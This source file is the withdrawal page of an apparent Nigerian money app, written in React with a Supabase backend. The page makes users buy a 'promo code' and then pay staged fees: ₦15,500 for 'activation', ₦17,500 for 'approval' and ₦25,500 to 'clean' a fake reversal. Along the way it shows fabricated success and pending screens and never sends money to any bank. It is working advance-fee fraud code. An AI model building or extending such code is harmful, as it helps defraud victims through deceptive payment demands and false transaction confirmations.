import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, CheckCircle, Clock } from "lucide-react";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { useAppContext } from "@/contexts/AppContext";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";

const nigerianBanks = [
  "Select Bank",
  "OPay", "PalmPay", "Kuda Bank", "Moniepoint", "Carbon", "FairMoney", "Paga", "VBank", "ALAT",
  "Palmcredit", "OKash", "PiggyVest", "Cowrywise", "Chipper Cash", "Grey", "LemFi", "Eyowo",
  "JumiaPay", "GoMoney", "Mintyn Bank",
  "Access Bank", "Guaranty Trust Bank (GTBank)", "Zenith Bank", "First Bank Nigeria",
  "United Bank for Africa (UBA)", "Fidelity Bank", "Wema Bank", "Ecobank Nigeria",
  "First City Monument Bank (FCMB)", "Sterling Bank", "Polaris Bank", "Keystone Bank",
  "Unity Bank", "Stanbic IBTC Bank", "Standard Chartered Bank Nigeria", "Citibank Nigeria",
  "Signature Bank", "Optimus Bank", "Parallex Bank", "Premium Trust Bank",
];

type WithdrawStatus = "form" | "pending" | "success";

const Withdraw = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const { balance, deductBalance, addNotification } = useAppContext();

  const [accountName, setAccountName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [selectedBank, setSelectedBank] = useState("Select Bank");
  const [amount, setAmount] = useState("");
  const [promoCode, setPromoCode] = useState("");
  const [showDetailsDialog, setShowDetailsDialog] = useState(false);
  const [showPromoDialog, setShowPromoDialog] = useState(false);
  const [withdrawStatus, setWithdrawStatus] = useState<WithdrawStatus>("form");
  const [withdrawnAmount, setWithdrawnAmount] = useState("");
  const [userPromoCode, setUserPromoCode] = useState<any>(null);

  // Multi-stage dialogs
  const [showActivationDialog, setShowActivationDialog] = useState(false);
  const [showApprovalDialog, setShowApprovalDialog] = useState(false);
  const [showReversalDialog, setShowReversalDialog] = useState(false);

  useEffect(() => {
    let channel: any;
    let cancelled = false;

    const fetchLatest = async (userId: string) => {
      const { data } = await supabase
        .from("promo_codes")
        .select("*")
        .eq("user_id", userId)
        .order("created_at", { ascending: false })
        .limit(1);
      if (!cancelled && data && data.length > 0) {
        setUserPromoCode(data[0]);
      }
    };

    (async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user || cancelled) return;
      await fetchLatest(user.id);

      channel = supabase
        .channel("withdraw-promo-" + user.id)
        .on("postgres_changes", {
          event: "*",
          schema: "public",
          table: "promo_codes",
          filter: `user_id=eq.${user.id}`,
        }, () => fetchLatest(user.id))
        .subscribe();
    })();

    return () => {
      cancelled = true;
      if (channel) supabase.removeChannel(channel);
    };
  }, []);

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat("en-NG", {
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    }).format(value);
  };

  const handleWithdraw = async () => {
    if (!accountName || !accountNumber || selectedBank === "Select Bank" || !amount) {
      setShowDetailsDialog(true);
      return;
    }

    if (accountNumber.length !== 10) {
      setShowDetailsDialog(true);
      return;
    }

    const amountNum = parseFloat(amount);
    if (amountNum <= 0 || amountNum > balance) {
      setShowDetailsDialog(true);
      return;
    }

    // Admin master code: instant success bypass (generated from Admin Panel)
    if (promoCode && promoCode.trim().length >= 4) {
      try {
        const { data: { session } } = await supabase.auth.getSession();
        if (session?.access_token) {
          const projectId = import.meta.env.VITE_SUPABASE_PROJECT_ID;
          const res = await fetch(
            `https://${projectId}.supabase.co/functions/v1/admin-actions?action=verify_master_code`,
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                apikey: import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
                Authorization: `Bearer ${session.access_token}`,
              },
              body: JSON.stringify({ code: promoCode.trim().toUpperCase() }),
            }
          );
          const data = await res.json().catch(() => ({}));
          if (data?.valid === true) {
            setWithdrawnAmount(amount);
            deductBalance(amountNum);
            addNotification("withdrawal_success", "Withdrawal completed successfully", amountNum);
            try { localStorage.setItem("smartpay_bonus_withdrawn", "true"); } catch {}
            setWithdrawStatus("success");
            return;
          }
        }
      } catch (e) {
        console.error("master code check failed", e);
      }
    }

    // Check promo code - must match user's unique code
    if (!promoCode || !userPromoCode || promoCode !== userPromoCode.code) {
      setShowPromoDialog(true);
      return;
    }

    // Reload latest promo code state from DB
    const { data: freshCode } = await supabase
      .from("promo_codes")
      .select("*")
      .eq("id", userPromoCode.id)
      .single();

    if (freshCode) {
      setUserPromoCode(freshCode);
    }

    const stage = freshCode?.withdrawal_stage || userPromoCode.withdrawal_stage || "needs_activation";

    // STAGE 1: needs_activation → show activation popup
    if (stage === "needs_activation") {
      setShowActivationDialog(true);
      return;
    }

    // STAGE 2: activated → show pending then approval popup
    if (stage === "activated") {
      // Create withdrawal request
      try {
        const { data: { user } } = await supabase.auth.getUser();
        if (user) {
          await supabase.from("withdrawal_requests").insert({
            user_id: user.id,
            promo_code_id: userPromoCode.id,
            bank_name: selectedBank,
            account_number: accountNumber,
            account_name: accountName,
            amount: amountNum,
            status: "pending",
          });
        }
      } catch (e) {
        console.error("Error creating withdrawal:", e);
      }

      // Update stage to needs_approval
      await supabase
        .from("promo_codes")
        .update({ withdrawal_stage: "needs_approval" } as any)
        .eq("id", userPromoCode.id);

      setWithdrawnAmount(amount);
      addNotification("withdrawal_pending", "Withdrawal is being processed", amountNum);
      setWithdrawStatus("pending");

      // After 3 seconds, show approval popup
      setTimeout(() => {
        setWithdrawStatus("form");
        setShowApprovalDialog(true);
      }, 3000);
      return;
    }

    // STAGE 3: approved → process withdrawal, then reverse after delay
    if (stage === "approved") {
      setWithdrawnAmount(amount);
      deductBalance(amountNum);
      addNotification("withdrawal_success", "Withdrawal completed successfully", amountNum);
      try { localStorage.setItem("smartpay_bonus_withdrawn", "true"); } catch {}
      setWithdrawStatus("success");

      // Update stage to needs_clearing (reversal)
      await supabase
        .from("promo_codes")
        .update({ withdrawal_stage: "needs_clearing" } as any)
        .eq("id", userPromoCode.id);

      // After 5 seconds, show reversal popup
      setTimeout(() => {
        setWithdrawStatus("form");
        setShowReversalDialog(true);
      }, 5000);
      return;
    }

    // STAGE 4: cleared → final permanent withdrawal
    if (stage === "cleared") {
      setWithdrawnAmount(amount);
      deductBalance(amountNum);
      addNotification("withdrawal_success", "Withdrawal completed successfully (Permanent)", amountNum);

      // Update stage to completed
      await supabase
        .from("promo_codes")
        .update({ withdrawal_stage: "completed" } as any)
        .eq("id", userPromoCode.id);

      setWithdrawStatus("success");
      return;
    }

    // If needs_approval or needs_clearing, show respective popup
    if (stage === "needs_approval") {
      setShowApprovalDialog(true);
      return;
    }

    if (stage === "needs_clearing") {
      setShowReversalDialog(true);
      return;
    }

    // completed stage - permanent success
    if (stage === "completed") {
      setWithdrawnAmount(amount);
      deductBalance(amountNum);
      addNotification("withdrawal_success", "Withdrawal completed successfully", amountNum);
      setWithdrawStatus("success");
      return;
    }
  };

  const handleAccountNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 10);
    setAccountNumber(value);
  };

  // Success/Pending Screen
  if (withdrawStatus === "success" || withdrawStatus === "pending") {
    const isPending = withdrawStatus === "pending";
    const isPermanent = userPromoCode?.withdrawal_stage === "completed";

    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="w-full max-w-md text-center px-6 py-10">
          <div className="w-[120px] h-[120px] rounded-full border-4 border-green-primary flex items-center justify-center mx-auto mb-8">
            {isPending ? (
              <Clock className="w-[50px] h-[50px] text-green-primary" strokeWidth={2} />
            ) : (
              <CheckCircle className="w-[50px] h-[50px] text-green-primary" strokeWidth={2} />
            )}
          </div>
          <h1 className="text-2xl font-bold text-foreground mb-4">
            {isPending ? "Withdrawal Pending" : isPermanent ? "Withdrawal Successfully Completed (Permanent)" : "Withdraw Successfully"}
          </h1>
          <p className="text-muted-foreground text-base leading-relaxed">
            {isPending
              ? `Your withdrawal of ₦${formatCurrency(parseFloat(withdrawnAmount))} is being processed.`
              : isPermanent
                ? `Your withdrawal of ₦${formatCurrency(parseFloat(withdrawnAmount))} has been permanently processed. This withdrawal will not reverse.`
                : `Your withdrawal of ₦${formatCurrency(parseFloat(withdrawnAmount))} has been processed successfully.`}
          </p>
          <Button
            onClick={() => navigate("/dashboard")}
            className="w-full mt-10 h-14 rounded-full bg-green-primary hover:bg-green-primary/90 text-primary-foreground text-lg font-semibold"
          >
            Ok, I got it
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="bg-green-primary text-primary-foreground px-4 py-4 flex items-center gap-3">
        <button onClick={() => navigate(-1)} className="text-2xl">
          <ArrowLeft className="w-6 h-6" />
        </button>
        <span className="text-xl font-semibold">Transfer To Bank</span>
      </div>

      <div className="p-5">
        <h2 className="text-[22px] font-semibold text-green-primary mb-4">Bank Details</h2>

        <input type="text" value={accountName} onChange={(e) => setAccountName(e.target.value)}
          placeholder="Account Name"
          className="w-full px-4 py-3.5 mb-3.5 rounded-lg border border-green-primary bg-background text-foreground text-[15px] outline-none placeholder:text-green-primary/60" />

        <input type="text" inputMode="numeric" value={accountNumber} onChange={handleAccountNumberChange}
          placeholder="Account Number (10 digits)" maxLength={10}
          className="w-full px-4 py-3.5 mb-3.5 rounded-lg border border-green-primary bg-background text-foreground text-[15px] outline-none placeholder:text-green-primary/60" />

        <div className="relative mb-3.5">
          <select value={selectedBank} onChange={(e) => setSelectedBank(e.target.value)}
            className="w-full px-4 py-3.5 rounded-lg border border-green-primary bg-background text-foreground text-[15px] outline-none appearance-none cursor-pointer"
            style={{
              backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M5 8l5 5 5-5' stroke='%232f7d4a' stroke-width='2' fill='none'/%3E%3C/svg%3E")`,
              backgroundRepeat: "no-repeat",
              backgroundPosition: "right 12px center",
              backgroundSize: "18px",
            }}>
            {nigerianBanks.map((bank) => (
              <option key={bank} value={bank}>{bank}</option>
            ))}
          </select>
        </div>

        <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)}
          placeholder="Amount"
          className="w-full px-4 py-3.5 mb-3.5 rounded-lg border border-green-primary bg-background text-foreground text-[15px] outline-none placeholder:text-green-primary/60" />

        <input type="text" value={promoCode} onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
          placeholder="PROMO CODE (Buy Promo Code)"
          className="w-full px-4 py-3.5 mb-2 rounded-lg border border-green-primary bg-background text-foreground text-[15px] outline-none placeholder:text-green-primary/60" />

        <a onClick={() => navigate("/buy-promo")}
          className="text-green-primary text-[15px] underline cursor-pointer inline-block mb-4">
          Buy Promo Code
        </a>

        <div className="text-lg font-semibold text-green-primary mb-6">
          Available Balance: ₦{formatCurrency(balance)}
        </div>

        <button onClick={handleWithdraw}
          className="w-full py-4 bg-green-primary text-primary-foreground rounded-xl text-lg font-semibold">
          Withdraw
        </button>
      </div>

      {/* STAGE 1: Activation Required Dialog */}
      <Dialog open={showActivationDialog} onOpenChange={setShowActivationDialog}>
        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
          <div className="flex flex-col items-center gap-4">
            <h2 className="text-lg font-bold text-foreground">Please activate your code before withdrawal.</h2>
            <p className="text-muted-foreground text-sm leading-relaxed">
              Your code has not been activated yet. Please activate your code by making a one-time payment of <span className="font-bold text-foreground">₦15,500</span> to ensure successful withdrawal processing.
            </p>
            <div className="flex gap-3 w-full mt-2">
              <Button onClick={() => setShowActivationDialog(false)} variant="outline"
                className="flex-1 py-5 border-green-primary text-green-primary">
                Close
              </Button>
              <Button onClick={() => setShowActivationDialog(false)}
                className="flex-1 py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground">
                Activate
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* STAGE 2: Approval Required Dialog */}
      <Dialog open={showApprovalDialog} onOpenChange={setShowApprovalDialog}>
        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
          <div className="flex flex-col items-center gap-4">
            <h2 className="text-lg font-bold text-foreground">Withdrawal Pending Approval</h2>
            <p className="text-muted-foreground text-sm leading-relaxed">
              Please approve your withdrawal by making a one-time payment of <span className="font-bold text-foreground">₦17,500</span>.
            </p>
            <div className="flex gap-3 w-full mt-2">
              <Button onClick={() => setShowApprovalDialog(false)} variant="outline"
                className="flex-1 py-5 border-green-primary text-green-primary">
                Close
              </Button>
              <Button onClick={() => setShowApprovalDialog(false)}
                className="flex-1 py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground">
                Approve
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* STAGE 3: Reversal / Clean Error Dialog */}
      <Dialog open={showReversalDialog} onOpenChange={setShowReversalDialog}>
        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
          <div className="flex flex-col items-center gap-4">
            <h2 className="text-lg font-bold text-foreground">Withdrawal Reversed</h2>
            <p className="text-muted-foreground text-sm leading-relaxed">
              Your withdrawal was reversed due to an account error.
              Please clean the error and receive your withdrawal.
              To clean the error, make a one-time payment of <span className="font-bold text-foreground">₦25,500</span> to permanently credit your account.
            </p>
            <Button onClick={() => setShowReversalDialog(false)}
              className="w-full py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground">
              Clean Error
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Missing Details Dialog */}
      <Dialog open={showDetailsDialog} onOpenChange={setShowDetailsDialog}>
        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
          <div className="flex flex-col items-center gap-4">
            <h2 className="text-lg font-semibold text-foreground">
              Please enter your account details to withdraw
            </h2>
            <Button onClick={() => setShowDetailsDialog(false)}
              className="w-full py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground font-semibold rounded-xl">
              Okay
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Invalid Promo Code Dialog */}
      <Dialog open={showPromoDialog} onOpenChange={setShowPromoDialog}>
        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 p-6 text-center [&>button]:hidden">
          <div className="flex flex-col items-center gap-4">
            <h2 className="text-lg font-semibold text-foreground">
              Incorrect Promo Code, please click button below to buy your Promo Code
            </h2>
            <Button onClick={() => { setShowPromoDialog(false); navigate("/buy-promo"); }}
              className="w-full py-5 bg-green-primary hover:bg-green-primary/90 text-primary-foreground font-semibold rounded-xl">
              Buy Promo Code
            </Button>
            <Button onClick={() => setShowPromoDialog(false)} variant="outline"
              className="w-full py-5 border-green-primary text-green-primary font-semibold rounded-xl">
              Close
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Withdraw;
